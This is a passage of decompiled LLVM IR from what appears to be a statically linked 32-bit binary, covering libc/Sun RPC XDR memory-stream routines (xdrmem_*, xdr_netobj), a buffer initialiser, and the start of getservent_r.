  br label %dec_label_pc_80643ca

dec_label_pc_80643ca:                             ; preds = %dec_label_pc_80643c1, %dec_label_pc_80643bc, %dec_label_pc_80643c5
  %v0_80643d1 = phi i32 [ 0, %dec_label_pc_80643c1 ], [ %storemerge, %dec_label_pc_80643bc ], [ 1, %dec_label_pc_80643c5 ]
  store i32 %v0_806430d, i32* %esi.global-to-local, align 4
  store i32 %v0_806430c, i32* @edi, align 4
  store i32 %v0_806430b, i32* @ebp, align 4
  ret i32 %v0_80643d1

; uselistorder directives
  uselistorder i32 %v2_8064364, { 0, 2, 1 }
  uselistorder i32 %v2_8064348.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8064348.pre, { 1, 0, 2 }
  uselistorder i32 %v2_806433b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_806430d, { 1, 0 }
  uselistorder i32 %v0_806430c, { 1, 0 }
  uselistorder i32 %v0_806430b, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @xdr_opaque, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80643ca, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80643bc, { 1, 0 }
  uselistorder label %dec_label_pc_80643a3, { 1, 0 }
  uselistorder label %dec_label_pc_8064348, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80643df = add i32 %arg2, 4
  %v4_80643e7 = inttoptr i32 %arg1 to i32*
  %v5_80643e7 = call i32 @xdr_bytes(i32* %v4_80643e7, i32 %v1_80643df, i32 %arg2, i32 1024)
  ret i32 %v5_80643e7
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  store i32 %tmp4, i32* %edx.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v2_80643fc = add i32 %tmp4, 16
  %v3_80643fc = inttoptr i32 %v2_80643fc to i32*
  store i32 %arg2, i32* %v3_80643fc, align 4
  %v0_80643ff = load i32, i32* %eax.global-to-local, align 4
  %v1_80643ff = load i32, i32* %edx.global-to-local, align 4
  %v2_80643ff = inttoptr i32 %v1_80643ff to i32*
  store i32 %v0_80643ff, i32* %v2_80643ff, align 4
  %v0_8064401 = load i32, i32* %edx.global-to-local, align 4
  %v1_8064401 = add i32 %v0_8064401, 4
  %v2_8064401 = inttoptr i32 %v1_8064401 to i32*
  store i32 ptrtoint (i32* @global_var_806e6e0.869 to i32), i32* %v2_8064401, align 4
  %v0_8064408 = load i32, i32* @ecx, align 4
  %v1_8064408 = load i32, i32* %edx.global-to-local, align 4
  %v2_8064408 = add i32 %v1_8064408, 12
  %v3_8064408 = inttoptr i32 %v2_8064408 to i32*
  store i32 %v0_8064408, i32* %v3_8064408, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_806440f = load i32, i32* %edx.global-to-local, align 4
  %v2_806440f = add i32 %v1_806440f, 20
  %v3_806440f = inttoptr i32 %v2_806440f to i32*
  store i32 %arg3, i32* %v3_806440f, align 4
  ret i32 %arg3

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v0_8064413 = load i32, i32* @eax, align 4
  ret i32 %v0_8064413
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8064418 = add i32 %arg1, 12
  %v2_8064418 = inttoptr i32 %v1_8064418 to i32*
  %v3_8064418 = load i32, i32* %v2_8064418, align 4
  %v2_806441b = add i32 %arg1, 16
  %v3_806441b = inttoptr i32 %v2_806441b to i32*
  %v4_806441b = load i32, i32* %v3_806441b, align 4
  %v5_806441b = sub i32 %v3_8064418, %v4_806441b
  ret i32 %v5_806441b
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806441f = load i32, i32* @ebx, align 4
  store i32 %v0_806441f, i32* %stack_var_-4, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_806442a = add i32 %arg1, 20
  %v2_806442a = inttoptr i32 %v1_806442a to i32*
  %v3_806442a = load i32, i32* %v2_806442a, align 4
  store i32 %v3_806442a, i32* %eax.global-to-local, align 4
  %v2_806442d = add i32 %arg1, 16
  %v3_806442d = inttoptr i32 %v2_806442d to i32*
  %v4_806442d = load i32, i32* %v3_806442d, align 4
  %v5_806442d = add i32 %v4_806442d, %arg2
  %v2_8064430 = add i32 %arg1, 12
  %v3_8064430 = inttoptr i32 %v2_8064430 to i32*
  %v4_8064430 = load i32, i32* %v3_8064430, align 4
  %v5_8064430 = add i32 %v4_8064430, %v3_806442a
  store i32 %v5_8064430, i32* %eax.global-to-local, align 4
  %v8_8064435 = icmp slt i32 %v5_8064430, %v5_806442d
  br i1 %v8_8064435, label %dec_label_pc_8064441, label %dec_label_pc_8064437

dec_label_pc_8064437:                             ; preds = %entry
  %v2_8064437 = sub i32 %v5_8064430, %v5_806442d
  store i32 %v2_8064437, i32* %eax.global-to-local, align 4
  store i32 %v5_806442d, i32* %v3_8064430, align 4
  %v0_806443c = load i32, i32* %eax.global-to-local, align 4
  %v1_806443c = load i32, i32* %ecx.global-to-local, align 4
  %v2_806443c = add i32 %v1_806443c, 20
  %v3_806443c = inttoptr i32 %v2_806443c to i32*
  store i32 %v0_806443c, i32* %v3_806443c, align 4
  %v0_806443f = load i32, i32* %ebx.global-to-local, align 4
  %v1_806443f = and i32 %v0_806443f, -256
  %v2_806443f = or i32 %v1_806443f, 1
  store i32 %v2_806443f, i32* %ebx.global-to-local, align 4
  %v2_8064443.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8064441

dec_label_pc_8064441:                             ; preds = %entry, %dec_label_pc_8064437
  %v2_8064443 = phi i32 [ %v0_806441f, %entry ], [ %v2_8064443.pre, %dec_label_pc_8064437 ]
  %v0_8064441 = phi i32 [ 0, %entry ], [ %v2_806443f, %dec_label_pc_8064437 ]
  store i32 %v0_8064441, i32* %eax.global-to-local, align 4
  store i32 %v2_8064443, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8064441

; uselistorder directives
  uselistorder i32 %v0_8064441, { 1, 0 }
  uselistorder i32 %v5_8064430, { 1, 0, 2 }
  uselistorder i32 %v5_806442d, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8064441, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8064445 = load i32, i32* @ebx, align 4
  store i32 %v0_8064445, i32* %stack_var_-4, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_8064450 = add i32 %arg1, 20
  %v2_8064450 = inttoptr i32 %v1_8064450 to i32*
  %v3_8064450 = load i32, i32* %v2_8064450, align 4
  %v7_8064453 = icmp ult i32 %v3_8064450, %arg2
  br i1 %v7_8064453, label %dec_label_pc_8064465, label %dec_label_pc_8064457

dec_label_pc_8064457:                             ; preds = %entry
  %v2_8064453 = sub i32 %v3_8064450, %arg2
  %v1_8064457 = add i32 %arg1, 12
  %v2_8064457 = inttoptr i32 %v1_8064457 to i32*
  %v3_8064457 = load i32, i32* %v2_8064457, align 4
  store i32 %v3_8064457, i32* %edx.global-to-local, align 4
  store i32 %v2_8064453, i32* %v2_8064450, align 4
  %v0_806445f = load i32, i32* %edx.global-to-local, align 4
  %v1_806445f = load i32, i32* %ebx.global-to-local, align 4
  %v2_806445f = add i32 %v1_806445f, %v0_806445f
  %v1_8064462 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8064462 = add i32 %v1_8064462, 12
  %v3_8064462 = inttoptr i32 %v2_8064462 to i32*
  store i32 %v2_806445f, i32* %v3_8064462, align 4
  %v0_8064465.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_8064467.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8064465

dec_label_pc_8064465:                             ; preds = %entry, %dec_label_pc_8064457
  %v2_8064467 = phi i32 [ %v0_8064445, %entry ], [ %v2_8064467.pre, %dec_label_pc_8064457 ]
  %v0_8064465 = phi i32 [ 0, %entry ], [ %v0_8064465.pre, %dec_label_pc_8064457 ]
  store i32 %v2_8064467, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8064465

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8064465, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_806446f = add i32 %arg1, 20
  %v2_806446f = inttoptr i32 %v1_806446f to i32*
  %v3_806446f = load i32, i32* %v2_806446f, align 4
  %tmp4 = icmp ult i32 %v3_806446f, 4
  br i1 %tmp4, label %dec_label_pc_8064493, label %dec_label_pc_8064477

dec_label_pc_8064477:                             ; preds = %entry
  %v1_8064477 = add i32 %v3_806446f, -4
  %v1_806447a = add i32 %arg1, 12
  %v2_806447a = inttoptr i32 %v1_806447a to i32*
  %v3_806447a = load i32, i32* %v2_806447a, align 4
  store i32 %v3_806447a, i32* %edx.global-to-local, align 4
  store i32 %v1_8064477, i32* %v2_806446f, align 4
  %v2_8064484 = load i32, i32* %arg2, align 4
  %v1_8064486 = call i32 @llvm.bswap.i32(i32 %v2_8064484)
  %v1_8064488 = load i32, i32* %edx.global-to-local, align 4
  %v2_8064488 = inttoptr i32 %v1_8064488 to i32*
  store i32 %v1_8064486, i32* %v2_8064488, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_806448f = load i32, i32* %ecx.global-to-local, align 4
  %v1_806448f = add i32 %v0_806448f, 12
  %v2_806448f = inttoptr i32 %v1_806448f to i32*
  %v3_806448f = load i32, i32* %v2_806448f, align 4
  %v4_806448f = add i32 %v3_806448f, 4
  store i32 %v4_806448f, i32* %v2_806448f, align 4
  %v0_8064493.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064493

dec_label_pc_8064493:                             ; preds = %entry, %dec_label_pc_8064477
  %v0_8064493 = phi i32 [ 0, %entry ], [ %v0_8064493.pre, %dec_label_pc_8064477 ]
  ret i32 %v0_8064493

; uselistorder directives
  uselistorder i32 %v3_806446f, { 1, 0 }
  uselistorder label %dec_label_pc_8064493, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_806449c = add i32 %arg1, 20
  %v2_806449c = inttoptr i32 %v1_806449c to i32*
  %v3_806449c = load i32, i32* %v2_806449c, align 4
  %tmp4 = icmp ult i32 %v3_806449c, 4
  br i1 %tmp4, label %dec_label_pc_80644c0, label %dec_label_pc_80644a4

dec_label_pc_80644a4:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_80644a4 = add i32 %v3_806449c, -4
  store i32 %v1_80644a4, i32* %v2_806449c, align 4
  %v0_80644aa = load i32, i32* %ecx.global-to-local, align 4
  %v1_80644aa = add i32 %v0_80644aa, 12
  %v2_80644aa = inttoptr i32 %v1_80644aa to i32*
  %v3_80644aa = load i32, i32* %v2_80644aa, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_80644b1 = inttoptr i32 %v3_80644aa to i32*
  %v2_80644b1 = load i32, i32* %v1_80644b1, align 4
  %v1_80644b3 = call i32 @llvm.bswap.i32(i32 %v2_80644b1)
  store i32 %v1_80644b3, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_80644bc = load i32, i32* %ecx.global-to-local, align 4
  %v1_80644bc = add i32 %v0_80644bc, 12
  %v2_80644bc = inttoptr i32 %v1_80644bc to i32*
  %v3_80644bc = load i32, i32* %v2_80644bc, align 4
  %v4_80644bc = add i32 %v3_80644bc, 4
  store i32 %v4_80644bc, i32* %v2_80644bc, align 4
  %v0_80644c0.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80644c0

dec_label_pc_80644c0:                             ; preds = %entry, %dec_label_pc_80644a4
  %v0_80644c0 = phi i32 [ 0, %entry ], [ %v0_80644c0.pre, %dec_label_pc_80644a4 ]
  ret i32 %v0_80644c0

; uselistorder directives
  uselistorder i32 %v3_806449c, { 1, 0 }
  uselistorder label %dec_label_pc_80644c0, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80644c9 = add i32 %arg1, 20
  %v2_80644c9 = inttoptr i32 %v1_80644c9 to i32*
  %v3_80644c9 = load i32, i32* %v2_80644c9, align 4
  %tmp4 = icmp ult i32 %v3_80644c9, 4
  br i1 %tmp4, label %dec_label_pc_80644ed, label %dec_label_pc_80644d1

dec_label_pc_80644d1:                             ; preds = %entry
  %v1_80644d1 = add i32 %v3_80644c9, -4
  %v1_80644d4 = add i32 %arg1, 12
  %v2_80644d4 = inttoptr i32 %v1_80644d4 to i32*
  %v3_80644d4 = load i32, i32* %v2_80644d4, align 4
  store i32 %v3_80644d4, i32* %edx.global-to-local, align 4
  store i32 %v1_80644d1, i32* %v2_80644c9, align 4
  %v2_80644de = load i32, i32* %arg2, align 4
  %v1_80644e0 = call i32 @llvm.bswap.i32(i32 %v2_80644de)
  %v1_80644e2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80644e2 = inttoptr i32 %v1_80644e2 to i32*
  store i32 %v1_80644e0, i32* %v2_80644e2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_80644e9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80644e9 = add i32 %v0_80644e9, 12
  %v2_80644e9 = inttoptr i32 %v1_80644e9 to i32*
  %v3_80644e9 = load i32, i32* %v2_80644e9, align 4
  %v4_80644e9 = add i32 %v3_80644e9, 4
  store i32 %v4_80644e9, i32* %v2_80644e9, align 4
  %v0_80644ed.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80644ed

dec_label_pc_80644ed:                             ; preds = %entry, %dec_label_pc_80644d1
  %v0_80644ed = phi i32 [ 0, %entry ], [ %v0_80644ed.pre, %dec_label_pc_80644d1 ]
  ret i32 %v0_80644ed

; uselistorder directives
  uselistorder i32 %v3_80644c9, { 1, 0 }
  uselistorder label %dec_label_pc_80644ed, { 1, 0 }
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80644f6 = add i32 %arg1, 20
  %v2_80644f6 = inttoptr i32 %v1_80644f6 to i32*
  %v3_80644f6 = load i32, i32* %v2_80644f6, align 4
  %tmp4 = icmp ult i32 %v3_80644f6, 4
  br i1 %tmp4, label %dec_label_pc_806451a, label %dec_label_pc_80644fe

dec_label_pc_80644fe:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_80644fe = add i32 %v3_80644f6, -4
  store i32 %v1_80644fe, i32* %v2_80644f6, align 4
  %v0_8064504 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064504 = add i32 %v0_8064504, 12
  %v2_8064504 = inttoptr i32 %v1_8064504 to i32*
  %v3_8064504 = load i32, i32* %v2_8064504, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_806450b = inttoptr i32 %v3_8064504 to i32*
  %v2_806450b = load i32, i32* %v1_806450b, align 4
  %v1_806450d = call i32 @llvm.bswap.i32(i32 %v2_806450b)
  store i32 %v1_806450d, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8064516 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064516 = add i32 %v0_8064516, 12
  %v2_8064516 = inttoptr i32 %v1_8064516 to i32*
  %v3_8064516 = load i32, i32* %v2_8064516, align 4
  %v4_8064516 = add i32 %v3_8064516, 4
  store i32 %v4_8064516, i32* %v2_8064516, align 4
  %v0_806451a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806451a

dec_label_pc_806451a:                             ; preds = %entry, %dec_label_pc_80644fe
  %v0_806451a = phi i32 [ 0, %entry ], [ %v0_806451a.pre, %dec_label_pc_80644fe ]
  ret i32 %v0_806451a

; uselistorder directives
  uselistorder i32 %v3_80644f6, { 1, 0 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 5, 16, 18, 19, 17 }
  uselistorder label %dec_label_pc_806451a, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_806452c = add i32 %arg1, 20
  %v2_806452c = inttoptr i32 %v1_806452c to i32*
  %v3_806452c = load i32, i32* %v2_806452c, align 4
  %v7_806452f = icmp ult i32 %v3_806452c, %arg3
  br i1 %v7_806452f, label %dec_label_pc_8064551, label %dec_label_pc_8064533

dec_label_pc_8064533:                             ; preds = %entry
  %v2_806452f = sub i32 %v3_806452c, %arg3
  store i32 %v2_806452f, i32* %v2_806452c, align 4
  %v0_8064539 = load i32, i32* @esi, align 4
  %v0_806453e = load i32, i32* %ebx.global-to-local, align 4
  %v1_806453e = add i32 %v0_806453e, 12
  %v2_806453e = inttoptr i32 %v1_806453e to i32*
  %v3_806453e = load i32, i32* %v2_806453e, align 4
  %v3_8064541 = inttoptr i32 %v3_806453e to i16*
  %v4_8064541 = call i32 @memcpy(i16* %v3_8064541, i32 %arg2, i32 %v0_8064539)
  %v1_8064546 = add i32 %v0_806453e, 12
  %v2_8064546 = inttoptr i32 %v1_8064546 to i32*
  %v3_8064546 = load i32, i32* %v2_8064546, align 4
  %v4_8064546 = load i32, i32* @esi, align 4
  %v5_8064546 = add i32 %v4_8064546, %v3_8064546
  store i32 %v5_8064546, i32* %v2_8064546, align 4
  br label %dec_label_pc_8064551

dec_label_pc_8064551:                             ; preds = %entry, %dec_label_pc_8064533
  %v0_8064554 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8064533 ]
  ret i32 %v0_8064554

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8064551, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8064564 = add i32 %arg1, 20
  %v2_8064564 = inttoptr i32 %v1_8064564 to i32*
  %v3_8064564 = load i32, i32* %v2_8064564, align 4
  %v7_8064567 = icmp ult i32 %v3_8064564, %arg3
  br i1 %v7_8064567, label %dec_label_pc_8064589, label %dec_label_pc_806456b

dec_label_pc_806456b:                             ; preds = %entry
  %v2_8064567 = sub i32 %v3_8064564, %arg3
  store i32 %v2_8064567, i32* %v2_8064564, align 4
  %v0_8064571 = load i32, i32* @esi, align 4
  %v0_8064572 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064572 = add i32 %v0_8064572, 12
  %v2_8064572 = inttoptr i32 %v1_8064572 to i32*
  %v3_8064572 = load i32, i32* %v2_8064572, align 4
  %v3_8064579 = inttoptr i32 %arg2 to i16*
  %v4_8064579 = call i32 @memcpy(i16* %v3_8064579, i32 %v3_8064572, i32 %v0_8064571)
  %v1_806457e = add i32 %v0_8064572, 12
  %v2_806457e = inttoptr i32 %v1_806457e to i32*
  %v3_806457e = load i32, i32* %v2_806457e, align 4
  %v4_806457e = load i32, i32* @esi, align 4
  %v5_806457e = add i32 %v4_806457e, %v3_806457e
  store i32 %v5_806457e, i32* %v2_806457e, align 4
  br label %dec_label_pc_8064589

dec_label_pc_8064589:                             ; preds = %entry, %dec_label_pc_806456b
  %v0_806458c = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_806456b ]
  ret i32 %v0_806458c

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8064589, { 1, 0 }
}

define i32 @__initbuf() local_unnamed_addr {
entry:
  %v0_8064593 = load i32, i32* @global_var_807ca00.870, align 512
  %v1_8064593 = icmp eq i32 %v0_8064593, 0
  %v1_806459a = icmp eq i1 %v1_8064593, false
  br i1 %v1_806459a, label %entry.dec_label_pc_80645ba_crit_edge, label %dec_label_pc_806459c

entry.dec_label_pc_80645ba_crit_edge:             ; preds = %entry
  %v0_80645bd.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80645ba

dec_label_pc_806459c:                             ; preds = %entry
  %v1_80645a4 = call i32 @malloc(i32 4237)
  store i32 %v1_80645a4, i32* @global_var_807ca00.870, align 512
  %v1_80645b1 = icmp eq i32 %v1_80645a4, 0
  %v1_80645b3 = icmp eq i1 %v1_80645b1, false
  br i1 %v1_80645b3, label %dec_label_pc_80645ba, label %dec_label_pc_80645b5

dec_label_pc_80645b5:                             ; preds = %dec_label_pc_806459c
  %v0_80645b5 = call i32 @abort()
  br label %dec_label_pc_80645ba

dec_label_pc_80645ba:                             ; preds = %entry.dec_label_pc_80645ba_crit_edge, %dec_label_pc_806459c, %dec_label_pc_80645b5
  %v0_80645bd = phi i32 [ %v1_80645a4, %dec_label_pc_806459c ], [ %v0_80645bd.pre, %entry.dec_label_pc_80645ba_crit_edge ], [ %v0_80645b5, %dec_label_pc_80645b5 ]
  ret i32 %v0_80645bd

; uselistorder directives
  uselistorder i32 %v1_80645a4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80645ba, { 2, 1, 0 }
}

define i32 @getservent_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg1 to i32
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80645be = load i32, i32* @ebp, align 4
  %v0_80645bf = load i32, i32* @edi, align 4
  %v0_80645c0 = load i32, i32* @esi, align 4
  %v0_80645c1 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %tmp15, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_80645db = inttoptr i32 %arg4 to i32*
  store i32 0, i32* %v1_80645db, align 4
  %v6_80645e1 = icmp ugt i32 %arg3, 139
  br i1 %v6_80645e1, label %dec_label_pc_80645f8, label %dec_label_pc_80645e3

dec_label_pc_80645e3:                             ; preds = %entry
  %v1_80645e3 = call i32 @__errno_location(i32 %v0_80645c1)
  store i32 %v1_80645e3, i32* %eax.global-to-local, align 4
  store i32 34, i32* @ebx, align 4
  %v1_80645ed = inttoptr i32 %v1_80645e3 to i32*
  store i32 34, i32* %v1_80645ed, align 4
  br label %dec_label_pc_8064784

dec_label_pc_80645f8:                             ; preds = %entry
  %v2_8064603 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8064603, i32* %eax.global-to-local, align 4
  store i32 %v2_8064603, i32* %stack_var_-60, align 4
  %v4_8064608 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  store i32 %v4_8064608, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8073ff0.871 to i32), i32* %stack_var_-60, align 4
  %v1_8064614 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  %v0_8064619 = load i32, i32* @ebp, align 4
  %v1_8064619 = add i32 %v0_8064619, 140
  %v0_8064623 = load i32, i32* @ebx, align 4
  %v1_8064623 = add i32 %v0_8064623, -140
  store i32 %v1_8064623, i32* @eax, align 4
  %v6_8064631 = icmp ugt i32 %v1_8064623, 4096
  br i1 %v6_8064631, label %dec_label_pc_8064648, label %dec_label_pc_8064633

dec_label_pc_8064633:                             ; preds = %dec_label_pc_80645f8
  %v1_8064633 = call i32 @__errno_location(i32 %v1_8064619)
  store i32 %v1_8064633, i32* %eax.global-to-local, align 4
  store i32 34, i32* @ebx, align 4
  %v1_806463d = inttoptr i32 %v1_8064633 to i32*
  store i32 34, i32* %v1_806463d, align 4
  br label %dec_label_pc_8064773

dec_label_pc_8064648:                             ; preds = %dec_label_pc_80645f8
  %v0_8064648 = load i32, i32* @global_var_807ca04.872, align 4
  %v1_8064648 = icmp eq i32 %v0_8064648, 0
  %v1_806464f = icmp eq i1 %v1_8064648, false
  br i1 %v1_806464f, label %dec_label_pc_8064683.preheader, label %dec_label_pc_8064651

dec_label_pc_8064651:                             ; preds = %dec_label_pc_8064648
  store i32 ptrtoint ([14 x i8]* @global_var_806e708.874 to i32), i32* %stack_var_-60, align 4
  %v2_806465d = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_806e708.874 to i32), i32 ptrtoint (i32* @global_var_806e751.873 to i32))
  store i32 %v2_806465d, i32* %eax.global-to-local, align 4
  store i32 %v2_806465d, i32* @global_var_807ca04.872, align 4
  %v1_806466a = icmp eq i32 %v2_806465d, 0
  %v1_806466c = icmp eq i1 %v1_806466a, false
  br i1 %v1_806466c, label %dec_label_pc_8064683.preheader, label %dec_label_pc_806466e

dec_label_pc_8064683.preheader:                   ; preds = %dec_label_pc_8064648, %dec_label_pc_8064651
  %v0_8064684.ph = phi i32 [ %v2_806465d, %dec_label_pc_8064651 ], [ %v0_8064648, %dec_label_pc_8064648 ]
  store i32 %v1_8064619, i32* %stack_var_-60, align 4
  %v3_806469336 = call i32 @fgets(i32 %v1_8064619, i32 4096, i32 %v0_8064684.ph)
  store i32 %v3_806469336, i32* %eax.global-to-local, align 4
  store i32 %v3_806469336, i32* @ebx, align 4
  %v1_806469d37 = icmp eq i32 %v3_806469336, 0
  br i1 %v1_806469d37, label %dec_label_pc_806466e, label %dec_label_pc_80646a1

dec_label_pc_806466e:                             ; preds = %dec_label_pc_8064683.preheader, %dec_label_pc_8064683.backedge, %dec_label_pc_8064651
  %v0_806466e = load i32, i32* %stack_var_-60, align 4
  %v1_806466e = call i32 @__errno_location(i32 %v0_806466e)
  store i32 %v1_806466e, i32* %eax.global-to-local, align 4
  store i32 5, i32* @ebx, align 4
  %v1_8064678 = inttoptr i32 %v1_806466e to i32*
  store i32 5, i32* %v1_8064678, align 4
  br label %dec_label_pc_8064773

dec_label_pc_80646a1:                             ; preds = %dec_label_pc_8064683.preheader, %dec_label_pc_8064683.backedge
  %v3_806469338 = phi i32 [ %v3_8064693, %dec_label_pc_8064683.backedge ], [ %v3_806469336, %dec_label_pc_8064683.preheader ]
  %v1_80646a1 = inttoptr i32 %v3_806469338 to i8*
  %v2_80646a1 = load i8, i8* %v1_80646a1, align 1
  %v11_80646a1 = icmp eq i8 %v2_80646a1, 35
  br i1 %v11_80646a1, label %dec_label_pc_8064683.backedge, label %dec_label_pc_80646a6

dec_label_pc_8064683.backedge:                    ; preds = %dec_label_pc_80646a1, %dec_label_pc_80646a6, %dec_label_pc_80646ba, %dec_label_pc_80646e6
  %v0_8064684.pre = load i32, i32* @global_var_807ca04.872, align 4
  store i32 %v1_8064619, i32* %stack_var_-60, align 4
  %v3_8064693 = call i32 @fgets(i32 %v1_8064619, i32 4096, i32 %v0_8064684.pre)
  store i32 %v3_8064693, i32* %eax.global-to-local, align 4
  store i32 %v3_8064693, i32* @ebx, align 4
  %v1_806469d = icmp eq i32 %v3_8064693, 0
  br i1 %v1_806469d, label %dec_label_pc_806466e, label %dec_label_pc_80646a1

dec_label_pc_80646a6:                             ; preds = %dec_label_pc_80646a1
  store i32 %v3_806469338, i32* %stack_var_-60, align 4
  %v3_80646ae = call i32 @__GI_strpbrk(i8* %v1_80646a1, i32 ptrtoint ([3 x i8]* @global_var_806e716.875 to i32))
  store i32 %v3_80646ae, i32* %eax.global-to-local, align 4
  %v1_80646b6 = icmp eq i32 %v3_80646ae, 0
  br i1 %v1_80646b6, label %dec_label_pc_8064683.backedge, label %dec_label_pc_80646ba

